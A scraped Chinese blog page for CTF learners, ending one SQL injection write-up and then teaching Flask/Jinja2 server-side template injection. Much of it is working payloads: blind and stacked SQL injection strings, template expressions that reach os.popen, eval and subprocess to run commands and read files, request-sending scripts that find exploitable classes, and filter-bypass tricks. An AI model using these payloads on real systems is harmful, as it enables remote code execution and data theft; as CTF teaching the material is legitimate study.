href="https://shuimao.xyz/2023/03/26/SQL%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8">上脚本!</a>,这里用到异或法实现真假的转化<br>payload:<code>id=0^(ascii(substr((select(database())),1,1))&gt;100)</code>,如果<code>ascii</code>条件为真,那就是<code>0^1</code>,结果还是1,这时候就会显示<code>Hello, glzjin wants a girlfriend.</code>,<code>ascii</code>条件为假,那就是<code>0^0</code>,结果为0,这时候显示<code>Error Occured When Fetch Result.</code><br>因为表名和字段名已经知道了,直接使用无空格转态脚本跑就行<br><strong>payload</strong>(这里group被过滤了,直接去掉就行)<br><code>id=0^(ascii(substr((select(flag)from(flag)),&#123;i&#125;,1))&gt;&#123;mid&#125;)</code></p>
<h1 id="签到难度"><a href="#签到难度" class="headerlink" title="签到难度"></a>签到难度</h1><p>签到难度大概是一般比赛的常规题</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>进入界面<img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230525215719.png"><br>丢个单引号试试,结果出现报错,丢入<code>%23</code>,恢复正常,存在注入点,且为单引号闭合<br>常规<code>union select</code>,结果提示<code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code>这个是一个正则表达,表示过滤了<code>select</code>,<code>update</code>,<code>delete</code>,<code>drop</code>,<code>insert</code>,<code>wher</code>,<code>.</code><br><code>/i</code>表示不区分大小写,常规的注入,遇到过滤<code>select</code>就完全行不通了,一般select被过滤最先想到的就是<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5">堆叠注入</a>,当然也还要<a target="_blank" rel="noopener" href="https://shuimao.xyz/2023/03/31/SQL%E6%B3%A8%E5%85%A52-0/#%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5">mysql8.0新特性</a>这样的考点<br>这边尝试堆叠注入,发现可行<br>用常规的堆叠注入的思路就能做,这边要注意的是,使用<code>?inject=1&#39;;show tables;%23</code>爆出的表名是<code>1919810931114514</code>,这边需要使用一对反引号进行包裹`,才能正常查询</p>
<p>还有一种非常规思路,因为页面提供了一个可以查询数据库的语句,只要我们利用堆叠注入mysql语句,将需要查的表和字段名改成已有的表和数据名<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230525221409.png"><br><strong>payload</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/09/SSTI%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/hearder.jpg">
      <meta itemprop="name" content="？？喵！！">
      <meta itemprop="description" content="瞄一下学过代码，写一个睡喵的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="睡猫的博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/05/09/SSTI%E6%B3%A8%E5%85%A5%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">SSTI注入的学习</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-05-09 21:03:01" itemprop="dateCreated datePublished" datetime="2023-05-09T21:03:01+08:00">2023-05-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-05-21 10:11:05" itemprop="dateModified" datetime="2023-05-21T10:11:05+08:00">2023-05-21</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hacker/" itemprop="url" rel="index"><span itemprop="name">Hacker</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>46 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SSTI简介"><a href="#SSTI简介" class="headerlink" title="SSTI简介"></a>SSTI简介</h1><p>SSTI 是服务器端模板注入（Server-Side Template Injection）的缩写。它实际上也是一种注入漏洞，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。</p>
<p>不同的语言下有不同的框架,不同的框架又有不同模板,不同的语言模板对应的注入点和闭合可能略有区别,但本质原理都是一样的,就是将用户输入的数据不加处理就添加在了前端页面上,然后再用模板渲染时,就有可能把用户输入的数据当成本身的语法(和SQL注入一样的),从而导致安全问题</p>
<p>使用模板可以让静态的html页面动态的展示内容,模板是一个响应文本的文件,其中占位符(变量)表示动态部分,告诉模板引擎具体的值需要从使用的数据中获取.使用真实值替换变量,在返回最终得到的字符串,这个程称为渲染</p>
<p>如果先将前端页面渲染,再将用户输入的数据添加在页面上,这样模板已经固定,就不会产生ssti的漏洞了(感觉和SQL的预处理又有点像)</p>
<p>有一个经典的图可以简单的判断是属于的哪一个模板<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/68747470733a2f2f692e696d6775722e636f6d2f47565a655671362e706e67.png"><br>红色箭头代表<code>内容</code>未被当做命令执行,绿色代表成功当做命令执行</p>
<h1 id="Flask框架下的ssti"><a href="#Flask框架下的ssti" class="headerlink" title="Flask框架下的ssti"></a>Flask框架下的ssti</h1><ol>
<li><p><strong>什么是Flask</strong><br>Flask是一个用python编写的轻量级web应用框架,默认使用的是jinja2模板引擎,python可以利用flask框架简单直接的启动一个web服务页面</p>
</li>
<li><p><strong>flask的变量</strong><br><code>&#123;&#123; ... &#125;&#125;</code>：装载一个变量，模板渲染时，会使用传进来的通命名参数将代表的值替换<br><code>&#123;% ... %&#125;</code>：装载一个控制语句<br><code>\&#123;\# ... \#\&#125;</code>：装载一个注释，模板渲染的时候会忽视这个值</p>
</li>
<li><p><strong>造成危险的函数</strong><br>使用jinja2模板有两种渲染方式<code>render_template()</code>和<code>render_template_string()</code><br><code>render_template()</code>是渲染文件的，<code>render_template_string()</code>是渲染字符串的<br>主要会造成ssti漏洞的是<code>render_template_string()</code>,如果传入参数是通过<code>%s</code>的形式获取而非变量取值语句的形式获取,例如,下面的一段代码会存在ssti</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name= request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">template = <span class="string">&#x27;&lt;h1&gt;Hello %s!&lt;/h1&gt;&#x27;</span> % name</span><br><span class="line"><span class="keyword">return</span> render_template_string(template, name=name)</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="jinja2中的ssti"><a href="#jinja2中的ssti" class="headerlink" title="jinja2中的ssti"></a>jinja2中的ssti</h2><p>在python的jinja2模板引擎中,有许多魔术方法,可以帮我们实现在各个类中的跳转,所有类的最终的父类都是<code>object</code>,也就是说,我们只要任意使用一个类型(比如字符型<code>&#39;&#39;</code>),然后向上找父类,最后就可以通过<code>object</code>到达任意子类<br><strong>流程</strong><br>我们需要找到一个危险类,这个类中有可以执行系统命令的危险函数,我们最终通过这个危险函数来实现命令执行<br>常见危险类<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230513175211.png"></p>
<h3 id="相关魔术方法"><a href="#相关魔术方法" class="headerlink" title="相关魔术方法"></a>相关魔术方法</h3><ol>
<li><p><code>__class__</code><br>查找当前类型的所属对象</p>
</li>
<li><p><code>__base__</code><br>找到当前类的上一层父类</p>
</li>
<li><p><code>__mro__[]</code><br>查找当前类的所有继承类,用<code>[]</code>可以指定某一个父类<br>如<code>__mro__[1]</code>和<code>__base__</code>是一样的</p>
</li>
<li><p><code>__subclasses__()[]</code><br>查找当前类的所有子类,用<code>[]</code>可以指定某一个子类</p>
</li>
<li><p><code>__init__</code><br>查看类是否重载,重载是值在程序运行时就已经加载好了这个模块到内存中,如果出现<code>wrapper</code>字眼,说明没有重载</p>
</li>
<li><p><code>__globals__</code><br>寻找当前类所有的方法及变量及参数,以字典的形式输出</p>
</li>
<li><p><code>__builtins__</code><br>是一个内置模块，它包含了 Python 中所有内置的函数和变量。这意味着你可以直接使用这些函数和变量，而不需要导入任何模块<br>例如，如果你在一个模块中定义了一个与内置函数同名的函数，但仍然需要使用内置函数，那么你可以通过访问 <code>__builtins__</code>模块来实现。<br>可以利用这个模块来调用<code>eval()</code>函数,再用<code>eval()</code>函数执行任意命令</p>
</li>
</ol>
<h3 id="危险函数的利用"><a href="#危险函数的利用" class="headerlink" title="危险函数的利用"></a>危险函数的利用</h3><ol>
<li><p><strong>popen</strong><br><code>popen</code>是<code>os</code>模块中的一个函数,可以实现系统命令执行,但是没有回显,要加上<code>.read()</code>才能回显<br><strong>payload:</strong> <code>__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()</code></p>
</li>
<li><p><strong>eval</strong><br>通过<code>__builtins__</code>模块可以调用<code>eval</code>函数,从而实现任意代码执行<br><strong>payload:</strong><br><code>&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__['__glo'+'bals__']['__builtins__']['eval']('__import__("os").popen("ls").read()')&#125;&#125;</code></p>
</li>
</ol>
<h3 id="脚本找危险类"><a href="#脚本找危险类" class="headerlink" title="脚本找危险类"></a>脚本找危险类</h3><p>使用脚本可以快速的定位到某个类对应的编号,<code>__subclasses__()[]</code>将编号写入<code>[]</code>内,就可以定位到指定的类中<br><strong>POST传参:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;需要查询的类&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;search&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    response=requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>

<p><strong>GET传参:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;需要查询的类&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    payload=<span class="string">&quot;?search=&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;]&#125;&#125;&quot;</span></span><br><span class="line">    newurl=url+payload</span><br><span class="line">    response=requests.get(url=newurl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>

<h3 id="脚本找危险函数"><a href="#脚本找危险函数" class="headerlink" title="脚本找危险函数"></a>脚本找危险函数</h3><p>也可以使用脚本来寻找哪个类中有<code>__builtins__</code>内置模块,然后寻找其中是否有危险函数<br><strong>POST传参:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;eval&#x27;</span>  <span class="comment">#需要查询的函数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;search&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    response=requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>GET传参:</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;eval&#x27;</span>  <span class="comment">#需要查询的函数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    payload=<span class="string">&quot;?search=&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line">    newurl=url+payload</span><br><span class="line">    response=requests.get(url=newurl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>

<h3 id="OS模块执行命令"><a href="#OS模块执行命令" class="headerlink" title="OS模块执行命令"></a>OS模块执行命令</h3><ol>
<li><p><strong>在其他函数中直接调用os模块</strong></p>
<ol>
<li><code>&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</code>显示当前flask有哪些函数和对象</li>
<li>通过<code>config</code>,调用os<br><strong>payload</strong><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></li>
<li>通过<code>url_for</code>,调用os<br><strong>payload</strong><code>&#123;&#123;url_for.__globals__.os.popen('ls').read()&#125;&#125;</code></li>
</ol>
</li>
<li><p><strong>在已经加载os模块的子类里调用os模块</strong><br>脚本查询哪些类中已经加载了os模块,输出编号</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;os.py&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    payload=<span class="string">&quot;?search=&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line">    newurl=url+payload</span><br><span class="line">    response=requests.get(url=newurl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>
<p>在已经加载os模块的子类里调用os模块<br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><h3 id="war类执行命令"><a href="#war类执行命令" class="headerlink" title="war类执行命令"></a>war类执行命令</h3><p>直接上<strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span>(x)<span class="keyword">in</span>().__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span><span class="string">&#x27;war&#x27;</span><span class="keyword">in</span>(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
<p>在所有子类中查找名称中包含“war”的类，然后使用该类的<code>_module</code>属性来访问<code>__builtins__</code>并导入os模块。然后，它使用os.popen函数运行命令cat flag.txt并读取输出。</p>
<h3 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h3><p>先用脚本查找危险类,如果可以找到<code>_frozen_importlib.Builtinlmporter</code>,就可以使用这个类的特性<br>这个类可以加载第三方库,使用<code>load_module</code>加载os模块<br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[编号][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="linecache执行命令"><a href="#linecache执行命令" class="headerlink" title="linecache执行命令"></a>linecache执行命令</h3><p><code>linecache</code>函数可以用于读取任意文件的某一行,由于这个函数中也引入了os模块,使用我们也可以利用这个函数调用os模块从而实现命令执行<br>先用脚本找到危险函数,然后直接引用其中的os即可<br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__.__globals__.linecache.os.popen(<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h3><p><code>subprocess.Popen</code>是Python中的一个类，它可以用来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。这个类是从Python2.4版本开始引入的，旨在替代其他几个老的模块或函数，比如：<code>os.system</code>, <code>os.spawn*</code>, <code>os.popen*</code>, <code>popen2.*</code>, <code>commands.*</code><br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[编号](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双花括号过滤绕过"><a href="#双花括号过滤绕过" class="headerlink" title="双花括号过滤绕过"></a>双花括号过滤绕过</h3><ol>
<li><strong>基本思路</strong><br>用<code>&#123;% %&#125;</code>代替<code>&#123;&#123; &#125;&#125;</code><br><code>&#123;%%&#125;</code>是flask框架下的控制语句,可以在语句中实现<code>set</code>,<code>if</code>,<code>for</code>等语句,并且是以<code>&#123;% end。。。 %&#125;</code>的形式结尾</li>
<li><strong>寻找编号</strong><br>先上<strong>payload</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>().__class__.__base__.__subclasses__()[<span class="string">&quot;+str(i)+&quot;</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()%&#125;OK&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
将这段代码放在脚本里,如果输出OK就代表成功找到,这个和之前方法没有本质上的区别,之前能用的payload改成这样<code>&#123;%%&#125;</code>的形式还是可以实现,但是还要想办法输出</li>
<li><strong>怎么输出</strong><br>其实要输出也很简单,在控制语句中<code>print</code>,就可以成功输出了<br>例如<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>().__class__.__base__.__subclasses__()[编号].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()%&#125;</span><br></pre></td></tr></table></figure>
或者之前的payload加print<br><code>&#123;%print(url_for.__globals__.os.popen('ls').read())%&#125;</code></li>
</ol>
<h3 id="无回显盲注"><a href="#无回显盲注" class="headerlink" title="无回显盲注"></a>无回显盲注</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><h4 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h4><h4 id="脚本盲注"><a href="#脚本盲注" class="headerlink" title="脚本盲注"></a>脚本盲注</h4><h3 id="中括号过滤绕过"><a href="#中括号过滤绕过" class="headerlink" title="中括号过滤绕过"></a>中括号过滤绕过</h3><ol>
<li><strong>__getitem()__代替[]</strong><br><code>__getitem__()</code>是python的一个魔术方法<br>对字典使用时,括号内代表的是字典的键,返回对应的键值<br>对列表使用时,括号内代表的是列表的索引,返回索引对应的值<br><code>__subclasses__()[编号]</code>等价与<code>__subclasses__().__getitem__(编号)</code></li>
</ol>
<h3 id="单双引号的过滤绕过"><a href="#单双引号的过滤绕过" class="headerlink" title="单双引号的过滤绕过"></a>单双引号的过滤绕过</h3><ol>
<li><strong>request模块绕过</strong><br>flask框架下内置了request模块.可以用于获取get和post提交的数据,但是和直接在python中使用request略有不同<br><strong>get传参</strong><code>request.args.name</code>这边的name为参数名<br><strong>post传参</strong><code>request.form.name</code>这边的name为参数名<br><strong>cookie传参</strong><code>request.cookies.name</code>这边的name为参数名</li>
<li><strong>替换关键字</strong><br>在原本需要引号包裹,或是关键词被过滤时,可以将request放在原本的位置,然后再传入参数<br>例如(执行命令<code>ls</code>)<br><code>?name=&#123;%print(url_for.__globals__.os.popen(request.args.cmd).read())%&#125;&amp;cmd=ls</code><br>一般题目是get传参我们也使用get传参,题目是post传参我们也使用post传参,因为如果后端没开启的传参模式会报错<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230518210329.png" alt="cookie传参"></li>
</ol>
<h3 id="下划线的过滤绕过"><a href="#下划线的过滤绕过" class="headerlink" title="下划线的过滤绕过"></a>下划线的过滤绕过</h3><ol>
<li><p><strong>过滤器</strong><br>过滤器用过管道符(<code>|</code>)与变量连接,还可以有可选的参数,效果类似于将这个变量输入函数中,然后获取输出结果,过滤器的本质也就是函数,多个过滤器可以通过管道符连接使用(将一个过滤器的输出作为下一个过滤器的输入)<br>下面是flask中常见的过滤器<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230518210908.png"></p>
</li>
<li><p><strong>过滤器+request模块</strong><br>可以用attr()过滤器+request模块实现对下划线的绕过<br>例如<br><code>&#123;&#123;().__class__.__base__&#125;&#125;</code>等价于<code>&#123;&#123;()|attr('__class__')|attr('__base__')&#125;&#125;</code><br>配合<code>request</code>可以<br><code>?name=&#123;&#123;()|attr(request.args.cla)|attr(request.args.ba)&#125;&#125;&amp;cla=__class__&amp;ba=__base__</code></p>
</li>
<li><p><strong>编码绕过</strong><br><code>16进制编码</code>,用<code>\x5f</code>来代替下划线<code>_</code>,用<code>\x2e</code>代替小数点<code>.</code><br>例如<strong>paylaod</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;cat app\x2epy&quot;</span>)[<span class="string">&quot;read&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>格式化字符串</strong><br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;%c%cclass%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>类似于这样的形式,不仅是下划线,关键字也可以采用这样的方式绕过</p>
</li>
<li><p><strong>取字符绕过</strong><br><code>&#123;%set xhx=(lipsum|string|list)[18]%&#125;</code>类似于这样的形式,在一个字符串中找到需要的那个字符,然后根据索引取到字符</p>
</li>
</ol>
<h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><ol>
<li><p>使用中括号<code>[]</code>绕过点<code>.</code><br>魔术方法和魔术方法之间的连接既可以用<code>.</code>,也可以用中括号,但是使用中括号必须用引号包裹字符串<br><code>&#123;&#123;().__class__.__base__&#125;&#125;</code>等价于<code>&#123;&#123;()["__class__"]["__base__"]&#125;&#125;</code></p>
</li>
<li><p>使用<code>attr</code>过滤器<br>和前面下划线绕过差不多,不再演示了</p>
</li>
</ol>
